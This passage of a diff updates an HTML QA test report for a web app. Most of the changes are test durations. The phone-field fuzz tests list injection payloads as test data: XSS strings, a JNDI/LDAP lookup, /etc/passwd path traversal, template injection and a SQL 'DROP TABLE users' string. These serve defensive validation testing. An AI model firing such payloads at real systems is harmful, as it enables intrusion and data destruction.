-completely blank white page.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.98s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa18_blocked_api_shows_no_white_screen</code></span></div>
+completely blank white page.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.99s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa18_blocked_api_shows_no_white_screen</code></span></div>
   </div>
 </details>
 
@@ -10523,11 +10523,11 @@ completely blank white page.</span></div><div class="td-row"><span class="td-lbl
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa18_slow_network_does_not_show_partial_data</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">4.39s</span>
+    <span class="trow-dur">4.37s</span>
   </summary>
   <div class="trow-details">
     <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">3G-throttled load must not display half-rendered components
-(e.g., 'undefined' user names from partial data).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">4.39s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa18_slow_network_does_not_show_partial_data</code></span></div>
+(e.g., 'undefined' user names from partial data).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">4.37s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa18_slow_network_does_not_show_partial_data</code></span></div>
   </div>
 </details>
 
@@ -10536,11 +10536,11 @@ completely blank white page.</span></div><div class="td-row"><span class="td-lbl
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa18_5xx_response_shown_friendly</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">3.14s</span>
+    <span class="trow-dur">2.97s</span>
   </summary>
   <div class="trow-details">
     <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">If a backend route returns 500, the user-facing page should
-not display a raw stacktrace or framework debug page.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.14s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa18_5xx_response_shown_friendly</code></span></div>
+not display a raw stacktrace or framework debug page.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.97s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa18_5xx_response_shown_friendly</code></span></div>
   </div>
 </details>
   </div>
@@ -10561,12 +10561,12 @@ not display a raw stacktrace or framework debug page.</span></div><div class="td
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa19_autonomous_exploration</span>
     <span class="trow-params">homepage_en, https://dev.prowhats.com/en</span>
-    <span class="trow-dur">80.83s</span>
+    <span class="trow-dur">80.90s</span>
   </summary>
   <div class="trow-details">
     <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Walks the page autonomously and reports any issues encountered.
 Hard-fails ONLY on confirmed bugs (JS errors, 5xx, broken navigation).
-Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">homepage_en, https://dev.prowhats.com/en</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">80.83s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa19_autonomous_exploration</code></span></div>
+Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">homepage_en, https://dev.prowhats.com/en</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">80.90s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa19_autonomous_exploration</code></span></div>
   </div>
 </details>
 
@@ -10629,10 +10629,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">['aaaaaaaaaaaaaaaaaaaaaaaaaaaaa0] · fill(payload)</span>
-    <span class="trow-dur">16.38s</span>
+    <span class="trow-dur">16.34s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['aaaaaaaaaaaaaaaaaaaaaaaaaaaaa0] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.38s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['aaaaaaaaaaaaaaaaaaaaaaaaaaaaa0] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.34s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
 
@@ -10641,10 +10641,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">['N'] · fill(payload)</span>
-    <span class="trow-dur">16.34s</span>
+    <span class="trow-dur">16.30s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['N'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.34s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['N'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.30s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
 
@@ -10653,10 +10653,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">['&lt;img src=x onerror=alert(1)&gt;'] · fill(payload)</span>
-    <span class="trow-dur">16.29s</span>
+    <span class="trow-dur">16.27s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['&lt;img src=x onerror=alert(1)&gt;'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.29s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['&lt;img src=x onerror=alert(1)&gt;'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.27s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
 
@@ -10665,10 +10665,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">['  \\n\\r  '] · fill(payload)</span>
-    <span class="trow-dur">16.26s</span>
+    <span class="trow-dur">16.30s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['  \\n\\r  '] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.26s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['  \\n\\r  '] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.30s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
 
@@ -10677,10 +10677,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">['enq522wjZRL9OaYsP6ihgIqLSmNqE] · fill(payload)</span>
-    <span class="trow-dur">16.30s</span>
+    <span class="trow-dur">16.29s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['enq522wjZRL9OaYsP6ihgIqLSmNqE] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.30s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['enq522wjZRL9OaYsP6ihgIqLSmNqE] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.29s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
 
@@ -10689,10 +10689,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">['1e308'] · fill(payload)</span>
-    <span class="trow-dur">16.31s</span>
+    <span class="trow-dur">16.26s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['1e308'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.31s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['1e308'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.26s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
 
@@ -10701,10 +10701,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">['3fAbnFbmOHnKYaXRvj7uff0LYTH8x] · fill(payload)</span>
-    <span class="trow-dur">16.28s</span>
+    <span class="trow-dur">16.30s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['3fAbnFbmOHnKYaXRvj7uff0LYTH8x] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.28s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['3fAbnFbmOHnKYaXRvj7uff0LYTH8x] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.30s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
 
@@ -10713,10 +10713,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">['${jndi:ldap://x.com/a}'] · fill(payload)</span>
-    <span class="trow-dur">16.26s</span>
+    <span class="trow-dur">16.30s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['${jndi:ldap://x.com/a}'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.26s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['${jndi:ldap://x.com/a}'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.30s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
 
@@ -10725,10 +10725,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">['00000000000000000000'] · fill(payload)</span>
-    <span class="trow-dur">16.29s</span>
+    <span class="trow-dur">16.30s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['00000000000000000000'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.29s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['00000000000000000000'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.30s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
 
@@ -10737,10 +10737,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">['${7*7}'] · fill(payload)</span>
-    <span class="trow-dur">16.24s</span>
+    <span class="trow-dur">16.34s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['${7*7}'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.24s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['${7*7}'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.34s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
 
@@ -10761,10 +10761,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">['\\x1b[31mred\\x1b[0m'] · fill(payload)</span>
-    <span class="trow-dur">16.30s</span>
+    <span class="trow-dur">16.31s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['\\x1b[31mred\\x1b[0m'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.30s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['\\x1b[31mred\\x1b[0m'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.31s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
 
@@ -10773,10 +10773,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">['\u4f60\u597d\u4e16\u754c'] · fill(payload)</span>
-    <span class="trow-dur">16.48s</span>
+    <span class="trow-dur">16.29s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['\u4f60\u597d\u4e16\u754c'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.48s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['\u4f60\u597d\u4e16\u754c'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.29s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
 
@@ -10785,10 +10785,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">['aaaaaaaaaaaaaaaaaaaaaaaaaaaaa1] · fill(payload)</span>
-    <span class="trow-dur">16.28s</span>
+    <span class="trow-dur">16.33s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['aaaaaaaaaaaaaaaaaaaaaaaaaaaaa1] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.28s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['aaaaaaaaaaaaaaaaaaaaaaaaaaaaa1] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.33s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
 
@@ -10797,10 +10797,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">['\u30cb \u30db \u30f3 \u30b4'] · fill(payload)</span>
-    <span class="trow-dur">16.29s</span>
+    <span class="trow-dur">16.28s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['\u30cb \u30db \u30f3 \u30b4'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.29s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['\u30cb \u30db \u30f3 \u30b4'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.28s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
 
@@ -10809,10 +10809,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">['&quot;&gt;&lt;svg/onload=alert(1)&gt;'] · fill(payload)</span>
-    <span class="trow-dur">16.26s</span>
+    <span class="trow-dur">16.30s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['&quot;&gt;&lt;svg/onload=alert(1)&gt;'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.26s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['&quot;&gt;&lt;svg/onload=alert(1)&gt;'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.30s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
 
@@ -10821,10 +10821,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">['data\\x00data'] · fill(payload)</span>
-    <span class="trow-dur">16.28s</span>
+    <span class="trow-dur">16.29s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['data\\x00data'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.28s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['data\\x00data'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.29s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
 
@@ -10833,10 +10833,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">['\U0001f980\U0001f680\U0001f4a5'] · fill(payload)</span>
-    <span class="trow-dur">16.27s</span>
+    <span class="trow-dur">16.28s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['\U0001f980\U0001f680\U0001f4a5'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.27s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['\U0001f980\U0001f680\U0001f4a5'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.28s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
 
@@ -10845,10 +10845,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">['../../../etc/passwd'] · fill(payload)</span>
-    <span class="trow-dur">16.33s</span>
+    <span class="trow-dur">16.37s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['../../../etc/passwd'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.33s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['../../../etc/passwd'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.37s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
 
@@ -10881,10 +10881,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">['NaN'] · fill(payload)</span>
-    <span class="trow-dur">16.27s</span>
+    <span class="trow-dur">16.29s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['NaN'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.27s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">For 30 synthesised inputs, verify the phone field invariants.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">['NaN'] · fill(payload)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">16.29s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa20_phone_field_invariants</code></span></div>
   </div>
 </details>
 
@@ -10893,10 +10893,10 @@ Soft passes when nothing meaningful surfaces.</span></div><div class="td-row"><s
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa20_phone_field_invariants</span>
     <span class="trow-params">[&quot;'); DROP TABLE users; , &quot;] · fill(payload)</span>
-    <span class="trow-dur">16.27s</span>
+    <span class="trow-dur">16.29s</span>
   </summary>
   <div class="trow-details">
